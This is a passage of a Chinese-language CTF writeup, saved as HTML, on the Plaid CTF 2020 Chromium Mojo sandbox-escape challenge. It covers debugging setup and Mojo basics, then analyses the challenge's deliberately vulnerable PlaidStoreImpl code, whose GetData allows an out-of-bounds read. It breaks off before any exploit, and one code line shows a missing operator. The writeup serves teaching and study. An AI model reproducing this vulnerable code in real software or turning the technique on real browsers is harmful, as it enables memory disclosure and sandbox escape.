@@ -1,0 +1,1013 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+
+
+<head>
+  <meta charset="utf-8" />
+   
+  <meta name="keywords" content="chrome, PlaidCTF2020, sandbox escape,漏洞挖掘, 调试, 代码, 计算机科学, Kiprey, Blog, 二进制，信息安全" />
+   
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    Plaid CTF 2020 mojo Writeup |  Kiprey&#39;s Blog
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+  
+  
+
+  
+<script>
+var _hmt = _hmt || [];
+(function() {
+	var hm = document.createElement("script");
+	hm.src = "https://hm.baidu.com/hm.js?acff2772e1f74a625e1e26c280afa6c2";
+	var s = document.getElementsByTagName("script")[0]; 
+	s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<link rel="alternate" href="/atom.xml" title="Kiprey's Blog" type="application/atom+xml">
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-mojo"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  Plaid CTF 2020 mojo Writeup
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2020/10/mojo/" class="article-date">
+  <time datetime="2020-10-03T07:20:22.000Z" itemprop="datePublished">2020-10-03</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/chrome/">chrome</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">7.8k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">35 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h2 id="1-简介">1. 简介</h2>
+<p>Plaid CTF 2020 <code>mojo</code> 是 chromium sandbox escape 沙箱逃逸的一道基础题，适合用于<code>chrome</code>入门。</p>
+<p>题目来源 - <a href="https://ctftime.org/task/11314" target="_blank" rel="noopener">ctftime - task11314</a></p>
+<a id="more"></a>
+<h2 id="2-环境配置">2. 环境配置</h2>
+<ul>
+<li>
+<p>由<code>dockerfile</code>中的命令可知，启动<code>chrome</code>的脚本为<code>visit.sh</code>。而该脚本的内容如下</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">timeout 20 ./chrome --headless --<span class="built_in">disable</span>-gpu --remote-debugging-port=1338 --<span class="built_in">enable</span>-blink-features=MojoJS,MojoJSTest <span class="string">"<span class="variable">$1</span>"</span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>由<code>visit.sh</code>中的命令可知，启动chrome的命令为</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chrome --headless --<span class="built_in">disable</span>-gpu --remote-debugging-port=1338 --<span class="built_in">enable</span>-blink-features=MojoJS,MojoJSTest &lt;URL&gt;</span><br></pre></td></tr></table></figure>
+<p>我们可以设置一个<code>--user-data-dir</code>参数来更加方便地使用<a href="https://chromedevtools.github.io/devtools-protocol/" target="_blank" rel="noopener">DevTools</a></p>
+<blockquote>
+<p>加上这个参数后，最直观的作用就是执行JS代码时，<strong>所有的<code>console.log</code>输出都将会同步输出至终端</strong>。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">基础知识：将DevTools用作协议客户端</span><br><span class="line">开发人员工具前端可以连接到远程运行的Chrome实例进行调试。为了使这种情况起作用，您应该使用remote-debugging-port命令行开关启动主机Chrome实例：</span><br><span class="line"></span><br><span class="line">chrome.exe --remote-debugging-port&#x3D; 9222</span><br><span class="line">然后，您可以使用不同的用户个人资料启动单独的客户端Chrome实例：</span><br><span class="line"></span><br><span class="line">chrome.exe --user-data-dir &#x3D; &lt;someDir&gt;</span><br><span class="line">现在，您可以从客户端导航到给定的端口，并附加到任何已发现的选项卡以进行调试：http:&#x2F;&#x2F;localhost:9222</span><br></pre></td></tr></table></figure>
+<p>即我们最后<strong>实际启动</strong>chrome的命令为</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chrome --headless --<span class="built_in">disable</span>-gpu --remote-debugging-port=1338 --user-data-dir=./userdata --<span class="built_in">enable</span>-blink-features=MojoJS,MojoJSTest &lt;URL&gt;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><code>--headless</code>：Chrome-headless 模式， Google 针对 Chrome 浏览器 59版 新增加的一种模式，可以让你不打开UI界面的情况下使用 Chrome 浏览器，所以运行效果与 Chrome 保持完美一致。使用该参数将不会启动chrome的GUI界面，如需启动GUI界面则需删除该参数。</p>
+<p><code>--enable-blink-features</code>：启用一个或多个启用Blink内核运行时的功能。在这里启用了<code>MojoJS</code></p>
+</blockquote>
+</li>
+<li>
+<p>笔者第一次执行时会报错，提示<code>No usable sandbox</code>。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Kiprey @ Kipwn in /usr/class/CTFs/mojo/chrome [15:10:00] C:1</span></span><br><span class="line">$ ./chrome --headless --<span class="built_in">disable</span>-gpu --remote-debugging-port=1338 --user-data-dir=./userdata --<span class="built_in">enable</span>-blink-features=MojoJS test.html</span><br><span class="line">[1003/151007.365372:FATAL:zygote_host_impl_linux.cc(116)] No usable sandbox! Update your kernel or see https://chromium.googlesource.com/chromium/src/+/master/docs/linux/suid_sandbox_development.md <span class="keyword">for</span> more information on developing with the SUID sandbox. If you want to live dangerously and need an immediate workaround, you can try using --no-sandbox.</span><br><span class="line"><span class="comment">#0 0x560df69de579 base::debug::CollectStackTrace()</span></span><br><span class="line"><span class="comment">#1 0x560df69426f3 base::debug::StackTrace::StackTrace()</span></span><br><span class="line"><span class="comment">#2 0x560df6954475 logging::LogMessage::~LogMessage()</span></span><br><span class="line"><span class="comment">#3 0x560df824a22e service_manager::ZygoteHostImpl::Init()</span></span><br><span class="line"><span class="comment">#4 0x560df652ad37 content::ContentMainRunnerImpl::Initialize()</span></span><br><span class="line"><span class="comment">#5 0x560df657965a service_manager::Main()</span></span><br><span class="line"><span class="comment">#6 0x560df6529351 content::ContentMain()</span></span><br><span class="line"><span class="comment">#7 0x560df657849d headless::(anonymous namespace)::RunContentMain()</span></span><br><span class="line"><span class="comment">#8 0x560df657819b headless::HeadlessShellMain()</span></span><br><span class="line"><span class="comment">#9 0x560df3feac27 ChromeMain</span></span><br><span class="line"><span class="comment">#10 0x7f953511cbbb __libc_start_main</span></span><br><span class="line"><span class="comment">#11 0x560df3feaa6a _start</span></span><br><span class="line"></span><br><span class="line">Received signal 6</span><br><span class="line"><span class="comment">#0 0x560df69de579 base::debug::CollectStackTrace()</span></span><br><span class="line"><span class="comment">#1 0x560df69426f3 base::debug::StackTrace::StackTrace()</span></span><br><span class="line"><span class="comment">#2 0x560df69de120 base::debug::(anonymous namespace)::StackDumpSignalHandler()</span></span><br><span class="line"><span class="comment">#3 0x7f95373c7520 (/usr/lib/x86_64-linux-gnu/libpthread-2.29.so+0x1351f)</span></span><br><span class="line"><span class="comment">#4 0x7f953512ff61 gsignal</span></span><br><span class="line"><span class="comment">#5 0x7f953511b535 abort</span></span><br><span class="line"><span class="comment">#6 0x560df69dd075 base::debug::BreakDebugger()</span></span><br><span class="line"><span class="comment">#7 0x560df6954914 logging::LogMessage::~LogMessage()</span></span><br><span class="line"><span class="comment">#8 0x560df824a22e service_manager::ZygoteHostImpl::Init()</span></span><br><span class="line"><span class="comment">#9 0x560df652ad37 content::ContentMainRunnerImpl::Initialize()</span></span><br><span class="line"><span class="comment">#10 0x560df657965a service_manager::Main()</span></span><br><span class="line"><span class="comment">#11 0x560df6529351 content::ContentMain()</span></span><br><span class="line"><span class="comment">#12 0x560df657849d headless::(anonymous namespace)::RunContentMain()</span></span><br><span class="line"><span class="comment">#13 0x560df657819b headless::HeadlessShellMain()</span></span><br><span class="line"><span class="comment">#14 0x560df3feac27 ChromeMain</span></span><br><span class="line"><span class="comment">#15 0x7f953511cbbb __libc_start_main</span></span><br><span class="line"><span class="comment">#16 0x560df3feaa6a _start</span></span><br><span class="line">  r8: 0000000000000000  r9: 00007ffcf028b6e0 r10: 0000000000000008 r11: 0000000000000246</span><br><span class="line"> r12: 00007ffcf028c9a8 r13: 00007ffcf028b980 r14: 00007ffcf028c9b0 r15: aaaaaaaaaaaaaaaa</span><br><span class="line">  di: 0000000000000002  si: 00007ffcf028b6e0  bp: 00007ffcf028b930  bx: 00007ffcf028b9a4</span><br><span class="line">  dx: 0000000000000000  ax: 0000000000000000  cx: 00007f953512ff61  sp: 00007ffcf028b6e0</span><br><span class="line">  ip: 00007f953512ff61 efl: 0000000000000246 cgf: 002b000000000033 erf: 0000000000000000</span><br><span class="line"> trp: 0000000000000000 msk: 0000000000000000 cr2: 0000000000000000</span><br><span class="line">[end of stack trace]</span><br><span class="line">Calling _exit(1). Core file will not be generated.</span><br></pre></td></tr></table></figure>
+<p>需要执行以下命令，以启用非特权用户命名空间 - <a href="https://github.com/puppeteer/puppeteer/blob/main/docs/troubleshooting.md#setting-up-chrome-linux-sandbox" target="_blank" rel="noopener">sandbox问题参考</a></p>
+<blockquote>
+<p>linux命名空间是一种轻量级的虚拟化手段 - <a href="https://www.cnblogs.com/long123king/p/3535462.html" target="_blank" rel="noopener">参考</a></p>
+</blockquote>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl -w kernel.unprivileged_userns_clone=1</span><br></pre></td></tr></table></figure>
+<p>之后即可正常运行chrome</p>
+</li>
+<li>
+<p>调试浏览器时，最好在本地开一个web服务，<strong>而不是让浏览器直接访问本地html文件</strong>，因为这其中<strong>访问的协议是不一样的</strong>。浏览器访问web服务的协议是<code>http</code>，而访问本地文件的协议是<code>file</code>。</p>
+<p>调试时尽量架设本地服务器来避免file协议与http协议实现过程中的某些差异，例如某些API的差异、跨域请求的差异等。</p>
+<p>我们在这里可以使用python自带的httpServer来启动一个web服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>使用<code>gdb script</code>来调试chrome</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gdbinit</span></span><br><span class="line"><span class="comment"># 读取符号</span></span><br><span class="line">file ./chrome</span><br><span class="line"><span class="comment"># 设置启动参数</span></span><br><span class="line"><span class="built_in">set</span> args --headless --<span class="built_in">disable</span>-gpu --remote-debugging-port=1338 --user-data-dir=./userdata --<span class="built_in">enable</span>-blink-features=MojoJS http://localhost:8000/test.html</span><br><span class="line"><span class="comment"># 设置执行fork后继续调试父进程</span></span><br><span class="line"><span class="built_in">set</span> follow-fork-mode parent</span><br></pre></td></tr></table></figure>
+<p>之后运行以下命令即可启动调试。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -x gidbinit</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="3-Mojo简介">3. Mojo简介</h2>
+<ul>
+<li>
+<p>Chrome安全体系架构的关键支撑就是沙箱。Chrome将网络的大部分攻击面（例如：DOM渲染、脚本执行、媒体解码等）限制在沙箱进程中。同时，存在一个中央进程，称之为浏览器进程，该进程可以完全不带沙箱运行。而Chrome的数个进程需要相互通信以完成工作协调，而这就涉及到了<strong>进程间或进程内的模块间通信</strong>（<code>IPC,Inter-Process Communication</code>）其中，Mojo是Chromium提供的用于IPC的一种机制。</p>
+</li>
+<li>
+<p>在Chrome中，Mojo机制使用C++实现。但Mojo仍然提供针对C++和JS语言的调用接口。</p>
+</li>
+<li>
+<p>我们可以通过启用MojoJS blink绑定（在Chrome命令行中使用<code>--enable-blink-features=MojoJS</code>）来模拟一个渲染器进程。这些绑定将Mojo平台直接暴露给JavaScript，从而使我们可以完全绕过Blink绑定，直接使用JS来调用Mojo平台中的代码。</p>
+<blockquote>
+<p>可以简单的理解为，Mojo的JS接口通过<code>--enable-blink-features=MojoJS</code>参数打开，这样外部JS代码可以直接调用Mojo的JS接口，降低漏洞利用难点。</p>
+</blockquote>
+</li>
+<li>
+<p>更多信息可以阅读<a href="https://chromium.googlesource.com/chromium/src.git/+/master/mojo/README.md" target="_blank" rel="noopener">Mojo Docs</a></p>
+</li>
+</ul>
+<h2 id="4-漏洞分析">4. 漏洞分析</h2>
+<blockquote>
+<p>注意！在阅读漏洞分析前，请先详细阅读</p>
+<ul>
+<li>
+<p><a href="https://www.jianshu.com/p/ce068f112945" target="_blank" rel="noopener">Mojo &amp; Services 简介</a></p>
+</li>
+<li>
+<p><a href="https://blog.csdn.net/tornmy/article/details/82748058" target="_blank" rel="noopener">chromium mojo 快速入门</a></p>
+</li>
+<li>
+<p><strong>重要！</strong> <strong><a href="https://blog.wuhao13.xin/1001.html" target="_blank" rel="noopener">利用Mojo IPC的UAF漏洞实现Chrome浏览器沙箱逃逸</a></strong></p>
+</li>
+</ul>
+<blockquote>
+<p>该文的翻译不是很到位，建议直接阅读<a href="https://theori.io/research/escaping-chrome-sandbox/" target="_blank" rel="noopener">原文</a></p>
+</blockquote>
+<p>并理解其中<strong>关于Mojo的更多详细信息</strong>以及<strong>指针生命周期的漏洞问题</strong>。该题基于上述文章中的漏洞改编而成。</p>
+</blockquote>
+<h3 id="a-代码提取">a. 代码提取</h3>
+<blockquote>
+<p>该题给出了一个<code>plaidstore.diff</code>文件。而这个diff文件向我们展示了新声明的Mojo接口。我们需要通过调用对应的MojoJS接口来利用其中的漏洞。</p>
+</blockquote>
+<p>在<code>plaidstore.diff</code>文件中可以看出，该版本实现了一个新接口<code>PlaidStore</code>。将相关代码从中剥离整理出，可分为三类：</p>
+<ul>
+<li>
+<p>一部分代码是在原Chrome代码中添加的代码片段。</p>
+<p>搜索可得，在<code>PopulateFrameBinders</code>函数中，该题新增了一个回调函数 - <a href="https://source.chromium.org/chromium/chromium/src/+/master:content/browser/browser_interface_binders.cc;l=743;bpv=0;bpt=1" target="_blank" rel="noopener">源码</a></p>
+<blockquote>
+<p>通过<code>chrome</code>代码交叉引用查询可得，调用层次为</p>
+<p><code>BrowserInterfaceBrokerImpl::PopulateBinderMap</code> -&gt; <code>PopulateBinderMap</code> -&gt; <code>PopulateFrameBinders</code></p>
+</blockquote>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PopulateFrameBinders</span><span class="params">(RenderFrameHostImpl* host, mojo::BinderMap* <span class="built_in">map</span>)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//....</span></span><br><span class="line">    <span class="comment">// 新添加的内容</span></span><br><span class="line">    <span class="built_in">map</span>-&gt;Add&lt;blink::mojom::PlaidStore&gt;(</span><br><span class="line">      base::BindRepeating(&amp;RenderFrameHostImpl::CreatePlaidStore,</span><br><span class="line">                          base::Unretained(host)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RenderFrameHostImpl::CreatePlaidStore</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    mojo::PendingReceiver&lt;blink::mojom::PlaidStore&gt; receiver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PlaidStoreImpl::Create(<span class="keyword">this</span>, <span class="built_in">std</span>::move(receiver));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>再一部分代码是mojo特有的接口文件，届时将会根据此文件生成对应接口<code>xx</code>。而该接口的实际实现是<code>xxImpl</code>。</p>
+<p>例如，下面定义的接口为<code>PlaidStore</code>，但C++中实际实现为<code>PlaidStoreImpl</code>类</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PlaidStore.mojom文件</span></span><br><span class="line"><span class="keyword">module</span> blink.mojom;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This interface provides a data store</span></span><br><span class="line">interface PlaidStore</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Stores data in the data store</span></span><br><span class="line">    StoreData(<span class="built_in">string</span> key, <span class="built_in">array</span>&lt;uint8&gt; data);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Gets data from the data store</span></span><br><span class="line">    GetData(<span class="built_in">string</span> key, uint32 count) = &gt; (<span class="built_in">array</span>&lt;uint8&gt; data);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>最后一部分代码是声明的<code>PlaidStore</code>接口所对应的C++实现<code>PlaidStoreImpl</code>类</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> content</span><br><span class="line">&#123;</span><br><span class="line">    PlaidStoreImpl::PlaidStoreImpl(</span><br><span class="line">        RenderFrameHost *render_frame_host)</span><br><span class="line">        : render_frame_host_(render_frame_host) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    PlaidStoreImpl::~PlaidStoreImpl() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">PlaidStoreImpl::StoreData</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;key,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">uint8_t</span>&gt; &amp;data)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!render_frame_host_-&gt;IsRenderFrameLive())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        data_store_[key] = data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">PlaidStoreImpl::GetData</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;key,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">uint32_t</span> count,</span></span></span><br><span class="line"><span class="function"><span class="params">        GetDataCallback callback)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!render_frame_host_-&gt;IsRenderFrameLive())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">std</span>::move(callback).Run(&#123;&#125;);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">auto</span> it = data_store_.find(key);</span><br><span class="line">        <span class="keyword">if</span> (it == data_store_.end())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">std</span>::move(callback).Run(&#123;&#125;);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">uint8_t</span>&gt; <span class="title">result</span><span class="params">(it-&gt;second.begin(), it-&gt;second.begin() count)</span></span>;</span><br><span class="line">        <span class="built_in">std</span>::move(callback).Run(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// static</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">PlaidStoreImpl::Create</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        RenderFrameHost *render_frame_host,</span></span></span><br><span class="line"><span class="function"><span class="params">        mojo::PendingReceiver&lt;blink::mojom::PlaidStore&gt; receiver)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        mojo::MakeSelfOwnedReceiver(<span class="built_in">std</span>::make_unique&lt;PlaidStoreImpl&gt;(render_frame_host),</span><br><span class="line">                                    <span class="built_in">std</span>::move(receiver));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="comment">// namespace content</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> content</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RenderFrameHost</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PlaidStoreImpl</span> :</span> <span class="keyword">public</span> blink::mojom::PlaidStore</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">explicit</span> <span class="title">PlaidStoreImpl</span><span class="params">(RenderFrameHost *render_frame_host)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Create</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">            RenderFrameHost *render_frame_host,</span></span></span><br><span class="line"><span class="function"><span class="params">            mojo::PendingReceiver&lt;blink::mojom::PlaidStore&gt; receiver)</span></span>;</span><br><span class="line"></span><br><span class="line">        ~PlaidStoreImpl() <span class="keyword">override</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// PlaidStore overrides:</span></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">StoreData</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;key,</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">uint8_t</span>&gt; &amp;data)</span> <span class="keyword">override</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">GetData</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;key,</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">uint32_t</span> count,</span></span></span><br><span class="line"><span class="function"><span class="params">            GetDataCallback callback)</span> <span class="keyword">override</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="comment">// 注意这里的`render_frame_host_`</span></span><br><span class="line">        RenderFrameHost *render_frame_host_;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>, <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">uint8_t</span>&gt;&gt; data_store_;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125; <span class="comment">// namespace content</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="b-OOB漏洞">b. OOB漏洞</h3>
+<blockquote>
+<p>OOB（Out Of Bound）是<strong>信息外带漏洞</strong>，例如越界读取等都属于OOB漏洞。</p>
+</blockquote>
+<p>在函数<code>PlaidStoreImpl::GetData</code>中，程序并没有对传入的参数<code>count</code>进行判断，因此该函数可以越界读取，返回比实际存储范围更大的数据。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PlaidStoreImpl::GetData</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;key,</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">uint32_t</span> count,</span></span></span><br><span class="line"><span class="function"><span class="params">      GetDataCallback callback)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!render_frame_host_-&gt;IsRenderFrameLive())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">std</span>::move(callback).Run(&#123;&#125;);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">auto</span> it = data_store_.find(key);</span><br><span class="line">    <span class="keyword">if</span> (it == data_store_.end())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">std</span>::move(callback).Run(&#123;&#125;);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 